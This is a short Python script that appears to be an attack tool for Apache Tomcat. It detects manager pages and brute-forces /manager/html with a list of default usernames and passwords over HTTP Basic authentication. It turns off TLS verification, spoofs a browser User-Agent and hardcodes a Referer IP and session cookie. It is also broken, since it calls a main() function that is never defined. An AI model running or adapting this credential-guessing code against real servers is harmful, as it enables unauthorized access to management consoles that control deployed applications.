import requests
import base64
import requests,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(url):
	response = requests.get(url,verify=False,timeout=5)
	if "tomcat" in response.text and "manager/html" in response.text:
		if url[-1]=='/':
			url=url+'manager/html'
		else:
			url=url+'/manager/html'
		usernamel=['admin','root','tomcat']
		passwordl=['admin','admin123','123456','tomcat','tomcat123','']
		total=[]
		for username in usernamel:
			for password in passwordl:
				key=username+':'+password
				bkey=base64.b64encode(key.encode()).decode()
				total.append(bkey)
		flag=[]
		for bkey in total:
			headers={
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
			'Connection': 'close',
			'Referer': 'http://132.228.5.112:8080/',
			'Upgrade-Insecure-Requests': '1',
			'Authorization': 'Basic '+bkey,
			'Cookie': 'JSESSIONID=01B99EBEF045DE9B91947D014E2365F5'
			}
			r=requests.get(url,headers=headers,verify=False,timeout=8)
			if r.status_code==200:
				flag.append(1)
				break
		if len(flag)>0:
			return True
		else:
			return False
	else:
		return False

if __name__ == '__main__':
	main()